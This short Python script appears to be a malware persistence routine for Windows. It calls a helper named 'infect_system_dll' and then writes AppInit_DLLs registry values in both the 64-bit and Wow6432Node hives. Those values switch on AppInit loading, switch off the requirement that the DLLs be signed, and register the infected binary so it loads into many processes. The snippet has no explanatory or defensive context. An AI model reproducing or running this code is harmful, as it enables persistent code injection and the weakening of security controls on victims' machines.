import winutils

binary = winutils.infect_system_dll()

# System32
winutils.set_registry_value('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows', 'LoadAppInit_DLLs', 0x1)
winutils.set_registry_value('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows', 'RequireSignedAppInit_DLLs', 0x0)
winutils.set_registry_value('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows', 'AppInit_DLLs', binary)

# SysWow64
winutils.set_registry_value('HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows', 'LoadAppInit_DLLs', 0x1)
winutils.set_registry_value('HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows', 'RequireSignedAppInit_DLLs', 0x0)
winutils.set_registry_value('HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows', 'AppInit_DLLs', binary)
